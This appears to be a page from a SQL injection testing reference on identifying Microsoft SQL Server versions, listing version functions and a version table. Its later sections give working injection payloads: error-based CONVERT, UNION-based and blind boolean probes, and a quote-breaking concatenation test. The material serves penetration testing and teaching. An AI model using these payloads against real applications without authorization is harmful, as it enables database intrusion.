---
title: Testing Version
description: Methods to determine the version of Microsoft SQL Server
category: Basics
order: 3
tags: ["version detection", "reconnaissance"]
lastUpdated: 2026-10-08
---

Identifying the version of Microsoft SQL Server is an important reconnaissance step in SQL injection testing. Different versions have different capabilities, vulnerabilities, and syntax support.

## Using Version Functions

MSSQL provides several functions to determine the database version:

| Function                               | Description                                                     |
| -------------------------------------- | --------------------------------------------------------------- |
| `@@VERSION`                            | Returns complete version string with build, edition and OS      |
| `@@MICROSOFTVERSION / 0x01000000`      | Returns the major version as an integer (e.g. 16); undocumented |
| `SERVERPROPERTY('ProductVersion')`     | Returns the major.minor.build.revision version number           |
| `SERVERPROPERTY('ProductLevel')`       | Returns the release level (RTM, SP1, ...); always RTM on 2017+  |
| `SERVERPROPERTY('ProductUpdateLevel')` | Returns the cumulative update (e.g. CU27); 2012+ builds only    |
| `SERVERPROPERTY('Edition')`            | Returns the edition (e.g. Enterprise Edition, Standard Edition) |

All of these are available to any login. SQL Server 2017 and later ship cumulative updates only, no service packs. `ProductUpdateLevel` was added in updates released from late 2015 (SQL Server 2012 and later); like any property the server does not know, it returns `NULL` on older builds.

## Examples

```sql
-- Basic version information
SELECT @@VERSION;

-- More specific information
SELECT SERVERPROPERTY('ProductVersion') AS Version,
       SERVERPROPERTY('ProductLevel') AS Level,
       SERVERPROPERTY('Edition') AS Edition;
```

Example `@@VERSION` output:

```text
Microsoft SQL Server 2022 (RTM-CU27) (KB5104824) - 16.0.4295.3 (X64)
    Aug 26 2026 11:02:22
    Copyright (C) 2022 Microsoft Corporation
    Developer Edition (64-bit) on Linux (Ubuntu 22.04.5 LTS) <X64>
```

## Version-based Detection Techniques

You can use conditional statements to determine the version when direct version output isn't visible. `PARSENAME(..., 4)` returns the major version from `ProductVersion` on every version, including the one-digit `9.00.x` of SQL Server 2005:

```sql
-- Test if version is 2012 or newer (major version >= 11)
IF CAST(PARSENAME(CAST(SERVERPROPERTY('ProductVersion') AS varchar(20)), 4) AS int) >= 11
    SELECT 'SQL Server 2012 or newer'
ELSE
    SELECT 'SQL Server 2008 R2 or older'
```

Syntax that only newer versions parse works even when no output is visible, because older versions answer with an error. `||` concatenation is new in SQL Server 2025:

```sql
-- No error on 2025, "Incorrect syntax near '|'" before
' AND 'a'||'b'='ab'--
```

## Common Version Identifiers

The `@@VERSION` output starts with different text depending on the version:

| Version String               | SQL Server Version           |
| ---------------------------- | ---------------------------- |
| Microsoft SQL Server 2025    | SQL Server 2025 (17.x)       |
| Microsoft SQL Server 2022    | SQL Server 2022 (16.x)       |
| Microsoft SQL Server 2019    | SQL Server 2019 (15.x)       |
| Microsoft SQL Server 2017    | SQL Server 2017 (14.x)       |
| Microsoft SQL Server 2016    | SQL Server 2016 (13.x)       |
| Microsoft SQL Server 2014    | SQL Server 2014 (12.x)       |
| Microsoft SQL Server 2012    | SQL Server 2012 (11.x)       |
| Microsoft SQL Server 2008 R2 | SQL Server 2008 R2 (10.50.x) |
| Microsoft SQL Server 2008    | SQL Server 2008 (10.0.x)     |
| Microsoft SQL Server 2005    | SQL Server 2005 (9.x)        |
| Microsoft SQL Server 2000    | SQL Server 2000 (8.x)        |
| Microsoft SQL Azure          | Azure SQL Database (12.x)    |

## Injection Examples

Numeric context (`WHERE id = <input>`); the UNION example assumes 3 columns with a string column in second position:

```sql
-- Error-based: the conversion error contains the full @@VERSION string
SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, @@VERSION)--

-- Using a UNION attack to display version
SELECT id, username, email FROM users WHERE id = -1 UNION ALL SELECT 1, @@VERSION, 3--

-- Blind: the row is returned only if the major version is 11 (2012) or higher
SELECT * FROM users WHERE id = 1 AND CAST(PARSENAME(CAST(SERVERPROPERTY('ProductVersion') AS varchar(20)), 4) AS int) >= 11--
```

Determining the specific version of MSSQL helps tailor the rest of your injection techniques to the features and vulnerabilities present in that version.
